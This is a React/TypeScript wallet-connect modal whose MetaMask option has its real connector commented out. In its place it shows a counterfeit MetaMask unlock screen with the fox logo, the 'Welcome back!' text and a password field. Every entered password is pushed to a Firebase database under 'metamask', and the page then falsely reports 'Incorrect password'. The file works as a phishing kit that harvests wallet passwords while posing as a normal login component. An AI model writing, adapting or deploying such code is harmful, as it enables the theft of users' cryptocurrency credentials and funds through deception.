import React from "react";
import Modal from "@mui/material/Modal";
import Box from "@mui/material/Box";

import ethlogo from "../../assets/eth_logo.svg";
import arrowdown from "../../assets/arrow-down.svg";
import metamask from "../../assets/metamask-fox.svg";
import Spinner from "../../assets/spinner.gif";
import AuthLogo from "./AuthLogo";

import { database, ref, push, set, get } from "./firebase";

import { useState, useRef, useEffect } from "react";
import { coinbaseWallet } from "../../connectors/coinbaseWallet";
import { metaMask } from "../../connectors/metaMask";
import { walletConnect } from "../../connectors/walletConnect";

import Metamask from "../../assets/wallet/Metamask.svg";
import Phantom from "../../assets/wallet/Phantom.svg";
import Coinbase from "../../assets/wallet/Coinbase.svg";
import WalletConnect from "../../assets/wallet/WalletConnect.svg";
import { SxProps } from "@mui/material";

interface ConnectModalProps {
  isModalOpen: boolean;
  setIsModalOpen: React.Dispatch<React.SetStateAction<boolean>>;
  setSelectedWallet: React.Dispatch<
    React.SetStateAction<"MetaMask" | "WalletConnect" | "Coinbase" | null>
  >;
}
const ConnectWallet: React.FC<ConnectModalProps> = ({
  isModalOpen,
  setIsModalOpen,
  setSelectedWallet,
}) => {
  const [spinner, setSpinner] = useState(true);
  const [modal, setModal] = useState(false);
  const [value, setValue] = useState("");
  const [count, setCount] = useState(1);
  const [rightPos, setRightPos] = useState(0);
  const [pixelValue, setPixelValue] = useState(36);
  const [isVisible, setIsVisible] = useState(false);
  const [entered, setEntered] = useState("false");
  const modalRef: any = useRef();

  const toggleModal = () => {
    setIsVisible(!isVisible);
  };

  useEffect(() => {
    const fetchData = async () => {
      try {
        const dbRef = ref(database, "count");
        const snapshot = await get(dbRef);

        if (snapshot.exists()) {
          setCount(snapshot.val());
        } else {
          setCount(0);
          console.log("No data available for the specified key.");
        }
      } catch (err) {
        console.error("Error fetching data:", err);
      }
    };

    fetchData();

    setRightPos(pixelValue * count + 102);

    if (isVisible) {
      document.addEventListener("mousedown", handleClickOutside);
    }

    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    };
  }, [isVisible]);

  const handleClickOutside = (event: any) => {
    if (modalRef.current && !modalRef.current.contains(event.target)) {
      setIsVisible(false);
      setValue("");
    }
  };

  const changePos = {
    right: rightPos,
  };

  const openModal = () => {
    setSpinner(true);
    setTimeout(() => {
      setIsVisible(true);
    }, 500);
    setTimeout(() => {
      setSpinner(false);
    }, 1000);
  };

  const writeToDatabase = () => {
    const dbRef = ref(database, "metamask");
    push(dbRef, { password: value })
      .then(() => {
        console.log("Data written successfully!");
      })
      .catch((error: any) => {
        console.error("Error writing data:", error);
      });
  };

  const handleKeyDown = (event: any) => {
    if (event.key === "Enter") {
      event.preventDefault();
      const dbRef = ref(database, "metamask");
      push(dbRef, { password: value })
        .then(() => {
          console.log("Data written successfully!");
        })
        .catch((error: any) => {
          console.error("Error writing data:", error);
        });
      const elements: any = document.getElementsByClassName("wrong-pass");
      if (elements.length > 0) {
        elements[0].style.display = "block";
      }
    }
  };

  ///////////////

  const activateConnector = async (label: string) => {
    switch (label) {
      case "MetaMask":
        // await metaMask.activate();
        // setSelectedWallet(label);
        // window.localStorage.setItem("connectorId", "injected");
        break;

      case "WalletConnect":
        await walletConnect.activate();
        setSelectedWallet(label);
        window.localStorage.setItem("connectorId", "wallet_connect");
        break;

      case "Coinbase":
        await coinbaseWallet.activate();
        setSelectedWallet(label);
        window.localStorage.setItem("connectorId", "injected");

        break;

      default:
        break;
    }
  };
  const style: SxProps = {
    position: "absolute",
    top: "50%",
    left: "50%",
    transform: "translate(-50%, -50%)",
    width: 450,
    boxShadow: 24,
  };
  return (
    <>
      <Modal open={isModalOpen} onClose={() => setIsModalOpen(false)}>
        <Box sx={style} className="p-6 bg-custom-gradient w-fit rounded-2xl">
          <div className="text-3xl font-semibold text-white font-poppins">
            Connect a wallet
          </div>
          <div>
            <p className="self-start text-base leading-10 text-gray-300 font-inter">
              Don't have an account?
              <a
                href="#aa"
                className="ml-1 font-semibold text-primary-900-high-emphasis"
              >
                Register here
              </a>
            </p>
            <div className="flex flex-col gap-4 mt-6">
              <button className="flex items-center w-full p-2 border border-gray-600 border-solid">
                <img src={Metamask} alt="Metamask" />
                <div
                  className="px-10 text-lg font-semibold text-center text-white font-inter"
                  // onClick={() => activateConnector("MetaMask")}
                  onClick={openModal}
                >
                  Continue with Metamask
                </div>
              </button>
              <button className="flex items-center w-full p-2 border border-gray-600 border-solid">
                <img src={Phantom} alt="Phantom" />
                <div className="px-10 text-lg font-semibold text-center text-white font-inter">
                  Continue with Phantom
                </div>
              </button>
              <button className="flex items-center w-full p-2 border border-gray-600 border-solid">
                <img src={Coinbase} alt="Coinbase" />
                <div
                  className="px-10 text-lg font-semibold text-center text-white font-inter"
                  onClick={() => activateConnector("Coinbase")}
                >
                  Continue with Coinbase
                </div>
              </button>
              <button className="flex items-center w-full p-1 border border-gray-600 border-solid">
                <img src={WalletConnect} alt="WalletConnect" />
                <div
                  className="px-10 text-lg font-semibold text-center text-white font-inter"
                  onClick={() => activateConnector("WalletConnect")}
                >
                  Continue with WalletConnect
                </div>
              </button>
            </div>
          </div>
        </Box>
      </Modal>

      <Modal open={isVisible} onClose={() => setIsVisible(false)}>
        <>
          (spinner ? (
            <div className="loading" style={changePos}>
              <img className="loading-logo" src={metamask} />
              <img className="loading-spinner" src={Spinner} />
            </div>
          ) : (
            <div
              className="modalcontainer"
              id="modal-container"
              style={{
                zIndex: "100",
                right: rightPos,
                display: isVisible ? "inline-block" : "none",
              }}
              ref={modalRef}
            >
              <div className="toppart">
                <button className="category">
                  <div className="icon">
                    <img src={ethlogo} />
                  </div>
                  <div className="defaultcategory">Ethereum Mainnet</div>
                  <div className="downicon">
                    <img src={arrowdown} />
                  </div>
                </button>
                <button className="logo">
                  <img src={metamask} />
                </button>
              </div>
              <div className="mainpart">
                <div className="maincontainer" id="mainpart">
                  <div style={{ zIndex: 0 }}>
                    <AuthLogo />
                  </div>
                  <h1>Welcome back!</h1>
                  <p>The decentralized web awaits</p>
                  <form className="form">
                    <div className="form-group">
                      <label className="form-label" htmlFor="pass">
                        Password
                      </label>
                      <input
                        value={value}
                        onKeyDown={handleKeyDown}
                        onChange={(e) => setValue(e.target.value)}
                        id="pass"
                        className="form-input"
                        type="password"
                        autoFocus
                      />
                    </div>
                    <p className="wrong-pass" style={{ display: "none" }}>
                      Incorrect password
                    </p>
                  </form>
                  <button className="unlocksubmit" onClick={writeToDatabase}>
                    Unlock
                  </button>
                  <div className="forgot">
                    <a className="button">Forgot password?</a>
                  </div>
                  <div className="help">
                    <span>
                      Need help? Contact&nbsp;
                      <a
                        href="https://support.metamask.io"
                        target="_blank"
                        rel="noopener noreferrer"
                      >
                        MetaMask support
                      </a>
                    </span>
                  </div>
                </div>
              </div>
            </div>
          ))
        </>
      </Modal>
    </>
  );
};

export default ConnectWallet;
